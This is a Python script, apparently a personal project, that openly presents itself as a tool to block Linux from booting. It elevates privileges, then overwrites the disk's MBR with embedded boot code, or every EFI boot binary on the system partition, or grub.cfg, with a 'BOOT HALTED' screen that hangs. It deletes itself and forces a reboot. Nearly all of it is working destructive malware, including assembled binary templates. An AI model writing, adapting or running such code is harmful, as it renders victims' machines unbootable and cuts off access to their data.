# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 01.03.2026
# APP: BLOCK_LINUX_BOOT
# TYPE: BLOCK_OS
# VERSION: LATEST
# PLATFORM: linux




MSG = '[ LINBOOT ]\nBOOT HALTED'




import os
from shutil import which
from re import compile as re
from subprocess import run as sp_run
from sys import exit as _exit, argv, platform, executable


__file__ = os.path.abspath(argv[0])


if platform != 'linux':
    print(f'DO NOT SUPPORT ({platform})')
    _exit(1)


IS_ROOT = os.getuid() == 0
IS_UEFI = os.path.exists('/sys/firmware/efi')

ESP_GUID = 'c12a7328-f81f-11d2-ba4b-00a0c93ec93b'
ESP_PATH = '/boot/efi'

GRUB = ('/boot/grub/grub.cfg' if os.path.isfile('/boot/grub/grub.cfg') 
    else '/boot/grub2/grub.cfg')

PROC_MOUNTS = '/proc/mounts'
SYS_DISK = '/sys/block'

SUDO = which('pkexec' if (os.environ.get('DISPLAY', False) 
    or os.environ.get('WAYLAND_DISPLAY', False)) else 'sudo')
MOUNT = which('mount')
UMOUNT = which('umount')
FINDMNT = which('findmnt')
LSBLK = which('lsblk')
CHATTR = which('chattr')
REBOOT = which('reboot')


if SUDO is None:
    SUDO = '/usr/bin/' + ('pkexec' if (os.environ.get('DISPLAY', False) 
        or os.environ.get('WAYLAND_DISPLAY', False)) else 'sudo')
    
if MOUNT is None:
    MOUNT = '/usr/bin/mount'

if UMOUNT is None:
    UMOUNT = '/usr/bin/umount'

if FINDMNT is None:
    FINDMNT = '/usr/bin/findmnt'

if LSBLK is None:
    LSBLK = '/usr/bin/lsblk'

if CHATTR is None:
    CHATTR = '/usr/bin/chattr'
    
if REBOOT is None:
    REBOOT = '/usr/sbin/reboot'


def writef(p, data):
    with open(p, 'wb') as f:
        f.seek(0, os.SEEK_SET)
        f.write(data)
        f.flush()
        os.fsync(f.fileno())


def cmd(c):
    try:
        return sp_run(c, capture_output=True, text=True).stdout
    except:
        return ''


def grub_cfg():
    cfg = [
        'set default=0', 
        'set timeout=0\n', 
        'menuentry "linboot" {', 
        '    clear'
    ]

    for n in MSG.splitlines():
        n = n.replace('"', '\\"')
        cfg.append(f'    echo "{n}"')

    cfg.extend(['    sleep 999999', '}'])

    return '\n'.join(cfg)


def make_mbr():
    '''
Returns a 16-bit Master Boot Record (MBR) binary.

This MBR was assembled using NASM from the following source:


BITS 16
ORG 0x7C00


start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti
    mov si, msg


output:
    lodsb
    cmp al, 0
    je loop
    mov ah, 0x0E
    mov bh, 0x00
    int 0x10
    jmp output


loop:
    cli
    hlt


msg db 'here is (MSG)', 0
dw 0xAA55
    '''

    SIZE = 512

    template = b'\xfa1\xc0\x8e\xd8\x8e\xc0\x8e\xd0\xbc\x00|\xfb\xbe\x1f|\xac<\x00t\x08\xb4\x0e\xb7\x00\xcd\x10\xeb\xf3\xfa\xf4'
    
    template_len = len(template)
    msg_len = len(MSG)
    end_msg_len = template_len + msg_len
    
    mbr = bytearray(SIZE)
    ptr = memoryview(mbr)

    ptr[0:template_len] = template
    ptr[template_len:end_msg_len] = MSG
    ptr[end_msg_len] = 0
    ptr[510] = 0x55
    ptr[511] = 0xAA

    return ptr


def make_efi():
    '''
Returns a 64-bit UEFI application binary.

This UEFI was assembled using NASM from the following source:


bits 64
default rel


EFI_SUCCESS                       equ 0
EFI_LOAD_ERROR                    equ 0x8000000000000001
EFI_INVALID_PARAMETER             equ 0x8000000000000002
EFI_UNSUPPORTED                   equ 0x8000000000000003
EFI_BAD_BUFFER_SIZE               equ 0x8000000000000004
EFI_BUFFER_TOO_SMALL              equ 0x8000000000000005
EFI_NOT_READY                     equ 0x8000000000000006
EFI_NOT_FOUND                     equ 0x8000000000000014
EFI_SYSTEM_TABLE_SIGNATURE        equ 0x5453595320494249


%macro UINTN 0
    RESQ 1
    alignb 8
%endmacro

%macro UINT32 0
    RESD 1
    alignb 4
%endmacro

%macro UINT64 0
    RESQ 1
    alignb 8
%endmacro

%macro EFI_HANDLE 0
    RESQ 1
    alignb 8
%endmacro

%macro POINTER 0
    RESQ 1
    alignb 8
%endmacro


struc EFI_TABLE_HEADER
    .Signature  UINT64
    .Revision   UINT32
    .HeaderSize UINT32
    .CRC32      UINT32
    .Reserved   UINT32
endstruc

struc EFI_SYSTEM_TABLE
    .Hdr                  RESB EFI_TABLE_HEADER_size
    .FirmwareVendor       POINTER
    .FirmwareRevision     UINT32
    .ConsoleInHandle      EFI_HANDLE
    .ConIn                POINTER
    .ConsoleOutHandle     EFI_HANDLE
    .ConOut               POINTER
    .StandardErrorHandle  EFI_HANDLE
    .StdErr               POINTER
    .RuntimeServices      POINTER
    .BootServices         POINTER
    .NumberOfTableEntries UINTN
    .ConfigurationTable   POINTER
endstruc


struc EFI_OUTPUT
    .reset      POINTER      
    .print      POINTER      
endstruc


section .text
global _start
_start:
    mov rcx, [rdx + EFI_SYSTEM_TABLE.ConOut]
    mov rdx, MSG
    call [rcx + EFI_OUTPUT.print]
    jmp $


section .data
MSG db __utf16__ `here is (MSG)`
    ''' 

    SIZE = 3584
    OFFSET = 2049

    template = b'MZx\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\t\xcd!\xb8\x01L\xcd!This program cannot be run in DOS mode.$\x00\x00PE\x00\x00d\x86\x03\x00\xe72\xa4i\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00"\x00\x0b\x02\x0e\x00\x00\x02\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00@\x01\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\n\x00`\x81\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00.text\x00\x00\x00\x13\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00`.data\x00\x00\x00\xd0\x07\x00\x00\x00 \x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\xc0.reloc\x00\x00\x0c\x00\x00\x00\x000\x00\x00\x00\x02\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00H\x8bJ@H\xba\x00 \x00@\x01\x00\x00\x00\xffQ\x08\xeb\xfe\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc'

    efi = bytearray(SIZE)
    ptr = memoryview(efi)

    msg = MSG + bytes(OFFSET - len(MSG))

    template_len = len(template)
    msg_len = len(msg)
    end_msg_len = template_len + msg_len

    ptr[0:template_len] = template
    ptr[template_len:end_msg_len] = msg
    ptr[end_msg_len:] = b'\x10\x00\x00\x0c\x00\x00\x00\x06\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    return ptr


def disk_bios():
    if not (os.path.isfile(PROC_MOUNTS) or os.path.isdir(SYS_DISK)):
        return None
    
    root_disk = cmd([FINDMNT, '-n', '-o', 'SOURCE', '/']).strip()

    if not os.path.exists(root_disk):
        with open(PROC_MOUNTS, 'r') as f:
            f.seek(0, os.SEEK_SET)

            for line in f:
                n = line.split()

                if (len(n) < 2) or (n[1] != '/'):
                    continue

                root_disk = n[0]
                break
            else:
                return None
            
    root_disk = re(r'p?\d+$').sub('', root_disk)
        
    SIGN = b'\x55\xaa'
   
    for n in os.listdir(SYS_DISK):
        if n not in root_disk:
            continue

        dev = f'/dev/{n}'

        try:
            with open(dev, 'rb') as f:
                f.seek(0, os.SEEK_SET)
                sector = memoryview(f.read(512))

                if (len(sector) == 512) and (sector[510:512] == SIGN):
                    return dev
        except:
            break

    return None


def get_esp():
    for line in cmd([LSBLK, '-l', '-n', '-o', 'NAME,PARTTYPE,MOUNTPOINT']).splitlines():
        n = line.strip().split()
        n_len = len(n)

        if (n_len < 2) or (n[1] != ESP_GUID):
            continue
        
        dev = n[0]
        esp = n[2] if n_len > 2 else ESP_PATH

        if os.path.exists(esp):
            return [dev, esp]
        
        os.makedirs(esp, exist_ok=True)
        cmd([MOUNT, f'/dev/{dev}', esp])

        if os.path.exists(esp):
            return [dev, esp]
 
    return [None, ESP_PATH if os.path.exists(ESP_PATH) else None]


def bootefi(esp):
    boot = []

    for root, _, files in os.walk(esp):
        for n in files:
            if n.endswith('.efi'):
                boot.append(os.path.join(root, n))

    return boot     


def BIOS():
    disk = disk_bios()

    if disk is None:
        DEFAULT()
        return
    
    mbr = make_mbr()

    try:
        writef(disk, mbr)  
        os.sync()  
    except:
        DEFAULT()


def UEFI():
    dev, esp = get_esp()

    if esp is None:
        DEFAULT()
        return
    
    efi = make_efi()
    written = False

    if dev is None:
        dev = cmd([FINDMNT, '-n', '-o', 'SOURCE', esp]).strip()

    cmd([UMOUNT, '-f', esp]) 
    os.makedirs(esp, exist_ok=True)
    cmd([MOUNT, '-o', 'rw,exec,suid,dev', dev, esp])

    for n in bootefi(esp):
        try:
            cmd([CHATTR, '-i', n])
            cmd([CHATTR, '-a', n])
            writef(n, efi)
            written = True
        except: 
            continue

    if not written:
        DEFAULT()
        return

    os.sync()


def DEFAULT():
    if not os.path.isfile(GRUB):
        _exit(-1)

    with open(GRUB, 'w') as f:
        f.seek(0, os.SEEK_SET)
        f.write(grub_cfg())
        f.flush()
    os.sync()


def main():
    global MSG

    if not isinstance(MSG, str):
        raise TypeError('(MSG) must be str')
    
    if IS_UEFI:
        if len(MSG) > 1000:
            raise OverflowError('(MSG) length > 1000')
        
        MSG = MSG.encode('UTF-16LE')
    else:
        if not MSG.isascii():
            raise ValueError(f'(MSG) must be ASCII')
        
        MSG = MSG.encode('ASCII')

        if len(MSG) > 478:
            raise OverflowError('(MSG) length > 478')
    
    not IS_ROOT and os.execv(SUDO, [SUDO, executable, __file__])

    (UEFI if IS_UEFI else BIOS)()
    
    if os.path.isfile(__file__): 
        try:
            os.remove(__file__)
        except: ...

    sp_run([REBOOT])
    _exit(0)


if __name__ == '__main__': main()